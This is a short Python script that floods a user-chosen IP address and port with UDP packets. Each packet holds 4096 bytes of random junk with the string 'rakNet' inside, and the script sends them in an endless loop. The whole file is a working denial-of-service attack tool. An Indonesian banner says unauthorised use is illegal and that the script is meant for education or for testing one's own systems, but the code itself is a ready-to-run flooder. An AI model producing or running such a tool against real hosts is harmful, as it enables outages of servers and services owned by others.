import socket
import sys
import random
import string

def generate_complex_payload(base="rakNet", size=4096):
    # Generate random junk data
    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size))
    # Combine with base payload in random positions
    return f"{junk[:size//2]}{base}{junk[size//2:]}".encode()

def udp_flood(target_ip, target_port):
    # Create UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Generate complex payload
    payload = generate_complex_payload()
    
    try:
        while True:
            # Send UDP packet
            sock.sendto(payload, (target_ip, target_port))
            print(f"Packet sent to {target_ip}:{target_port} | Size: {len(payload)} bytes")
    except KeyboardInterrupt:
        print("\nAttack stopped by user")
    finally:
        sock.close()

if __name__ == "__main__":
    # Peringatan etika
    print("PERINGATAN: Penggunaan script ini untuk menyerang target tanpa izin adalah ILEGAL!")
    print("Gunakan hanya untuk tujuan edukasi atau testing sistem Anda sendiri!\n")
    
    # Input target
    target_ip = input("Masukkan IP target: ")
    target_port = int(input("Masukkan port target: "))
    
    # Jalankan flood
    udp_flood(target_ip, target_port)
